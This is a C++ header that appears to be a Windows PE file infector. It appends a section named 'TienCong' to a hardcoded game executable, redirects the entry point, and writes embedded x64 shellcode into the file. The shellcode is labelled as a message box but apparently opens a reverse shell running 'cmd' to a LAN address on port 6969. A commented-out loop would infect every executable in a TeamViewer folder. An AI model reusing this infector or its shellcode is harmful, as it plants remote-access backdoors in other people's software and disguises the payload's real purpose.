#pragma once
#include<Windows.h>
#include<iostream>
#include<stdio.h>

using namespace std;

DWORD align(DWORD size, DWORD align, DWORD address) {
	if (!(size % align)) {
		return address + size;
	}
	return address + (size / align + 1) * align;
}

int checkLastThreeStrings(wstring input) {
    int len = input.length(); // get length of input string
    bool is_exe = true; // initialize is_exe to true
    wstring last_three_strings = L""; // initialize last_three_strings to an empty string

    if (len >= 3) { // check if input string has at least 3 characters
        last_three_strings = input.substr(len - 3); // extract last three characters
    }
    else {
        last_three_strings = input; // if input string has fewer than 3 characters, extract the whole string
    }

    if (last_three_strings != L"exe") { // check if the last 3 characters are not "exe"
        is_exe = false; // set is_exe to false
    }

    if (is_exe) { // if is_exe is still true
        return 1; // return 1
    }
    else {
        return 0; // otherwise, return 0
    }
}


void addCode(HANDLE& file, PIMAGE_NT_HEADERS& ntHeader, PIMAGE_SECTION_HEADER& sectionHeader, WORD section_count, LPVOID byte, DWORD& fileSize, DWORD& byteWritten) {
    ntHeader->FileHeader.Characteristics = 0x010F;
    char sectionName[] = "TienCong";
    // Get current section
    PIMAGE_SECTION_HEADER currentSection = sectionHeader + section_count - 1;

    PIMAGE_SECTION_HEADER firstSection = IMAGE_FIRST_SECTION(ntHeader);
    PIMAGE_SECTION_HEADER lastSection = firstSection + (ntHeader->FileHeader.NumberOfSections - 1);

    DWORD lastEntryPoint = ntHeader->OptionalHeader.AddressOfEntryPoint + ntHeader->OptionalHeader.ImageBase;
    printf("Last entry point: %x\n", lastEntryPoint);
    ntHeader->OptionalHeader.AddressOfEntryPoint = lastSection->VirtualAddress;

    SetFilePointer(file, 0, NULL, FILE_BEGIN);
    WriteFile(file, byte, fileSize, &byteWritten, NULL);
    SetFilePointer(file, lastSection->PointerToRawData, NULL, FILE_BEGIN);
    printf("LastSection -> PointerToRawData: %x\n", lastSection->PointerToRawData);

    const char* shellcode_message_box = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
                                        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
                                        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
                                        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
                                        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
                                        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
                                        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
                                        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
                                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
                                        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
                                        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
                                        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
                                        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
                                        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
                                        "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                                        "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
                                        "\x00\x49\x89\xe5\x49\xbc\x02\x00\x1b\x39\xc0\xa8\x05\x85"
                                        "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
                                        "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
                                        "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
                                        "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
                                        "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
                                        "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
                                        "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
                                        "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
                                        "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
                                        "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
                                        "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
                                        "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
                                        "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
                                        "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
                                        "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
                                        "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";


    printf("Shellcode size: %d\n", strlen(shellcode_message_box));
    DWORD shellcodeSize = strlen(shellcode_message_box);
    WriteFile(file, shellcode_message_box, 460, &byteWritten, NULL);

    //Get Entry Point
    for (int i = 0; i < 4; i++) {
        BYTE carry = (BYTE)(lastEntryPoint >> (i * 8));
        printf("Last entry Point: %x\n", lastEntryPoint);
        printf("Carry: %x\n", carry);
        WriteFile(file, &carry, 1, &byteWritten, NULL);
    }

    // Add \xc3 to the end of shellcode
    const char* shellcode_return_instruction = "\xc3";
    WriteFile(file, shellcode_return_instruction, 1, &byteWritten, NULL);
    //CloseHandle(file);
}


bool infect() {
    char sectionName[] = "TienCong";
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS64 ntHeader;
    PIMAGE_SECTION_HEADER sectionHeader;
    DWORD filesize = 0;
    LPVOID fileData = NULL;
    DWORD byteRead = 0;
    DWORD byteWritten;
    DWORD64 section_virtual_size = 0x00001690;
    DWORD64 section_raw_size = 0x00000400;
    DWORD64 section_raw_address = 0x00007800;
    DWORD64 section_characterist = 0xE00000E0;
    HANDLE file;
    LPCWSTR fileName = L"D:\\games64\\OpenTTD\\openttd.exe";

    /*const wstring folderPathW = L"C:\\Program Files\\TeamViewer";
    WIN32_FIND_DATAW findDataW;
    HANDLE hFind = FindFirstFileW((folderPathW + L"\\*").c_str(), &findDataW);
    if (hFind == INVALID_HANDLE_VALUE) {
        cout << "ERROR: Could not open file or directory" << endl;
        return false;
    }*/
    /*do {
        if (findDataW.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;
        }
        wstring file_name_path = folderPathW + L"\\" + findDataW.cFileName;        
        int result = checkLastThreeStrings(findDataW.cFileName);
        if (result != 1) {
            return false;
        }
        else {
            continue;
        }*/
       // wcout << "Inject into: " << file_name_path << "........." << endl;
        file = CreateFileW(fileName, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (file == INVALID_HANDLE_VALUE) {
            cout << "Read file error!" << endl;
            return false;
        }

        filesize = GetFileSize(file, NULL);
        fileData = HeapAlloc(GetProcessHeap(), 0, filesize);
        //Read File
        ReadFile(file, fileData, filesize, &byteRead, NULL);

        dosHeader = (PIMAGE_DOS_HEADER)fileData;
        printf("DOS header: %x\n", dosHeader->e_magic );
        printf("DOS header lfanew: %x\n", dosHeader->e_lfanew);
        ntHeader = (PIMAGE_NT_HEADERS64)((DWORD64)fileData + (DWORD64)dosHeader->e_lfanew);

        printf("Signature: %x\n", ntHeader->Signature);
        printf("ImageBase: %x\n", ntHeader->OptionalHeader.ImageBase);
        printf("Maigc: %x\n", ntHeader->OptionalHeader.Magic);
        printf("Entry point: %x\n", ntHeader->OptionalHeader.AddressOfEntryPoint);
        printf("Number of Section: %x\n", ntHeader->FileHeader.NumberOfSections);

        sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        WORD section_count = (WORD)ntHeader->FileHeader.NumberOfSections;

        printf("Section count: %d\n", section_count);
        printf("section name: %x\n", sectionHeader[section_count-2].Name); 
        printf("Section Virtual Address: %x\n", sectionHeader[section_count-2].VirtualAddress);
        printf("Section raw address: %x\n", sectionHeader[section_count-2].SizeOfRawData);
        printf("Size of section header: %d", sizeof(IMAGE_SECTION_HEADER));

        //Add section name to header of the last section
        //ZeroMemory(&sectionHeader[section_count], sizeof(IMAGE_SECTION_HEADER));
        CopyMemory(&sectionHeader[section_count].Name, sectionName, 8); // Add name to section that we create

        sectionHeader[section_count].Misc.VirtualSize = align(400, ntHeader->OptionalHeader.SectionAlignment, 0);
        sectionHeader[section_count].VirtualAddress = align(sectionHeader[section_count - 1].Misc.VirtualSize, ntHeader->OptionalHeader.SectionAlignment, sectionHeader[section_count - 1].VirtualAddress);
        sectionHeader[section_count].SizeOfRawData = align(400, ntHeader->OptionalHeader.FileAlignment, 0);
        sectionHeader[section_count].PointerToRawData = align(sectionHeader[section_count - 1].SizeOfRawData, ntHeader->OptionalHeader.FileAlignment, sectionHeader[section_count - 1].PointerToRawData);
        sectionHeader[section_count].Characteristics = 0xE00000E0;

        SetFilePointer(file, sectionHeader[section_count].PointerToRawData + sectionHeader[section_count].SizeOfRawData, NULL, FILE_BEGIN);
        SetEndOfFile(file);


        ntHeader->OptionalHeader.SizeOfImage = sectionHeader[section_count].Misc.VirtualSize + sectionHeader[section_count].VirtualAddress;
        ntHeader->FileHeader.NumberOfSections += 1;
        SetFilePointer(file, 0, NULL, FILE_BEGIN);
        WriteFile(file, fileData, filesize, &byteWritten, NULL);
        addCode(file, ntHeader, sectionHeader, section_count, fileData, filesize, byteWritten);
   /* } while (FindNextFileW(hFind, &findDataW));
    return true;*/
        return true;
        CloseHandle(&file);
}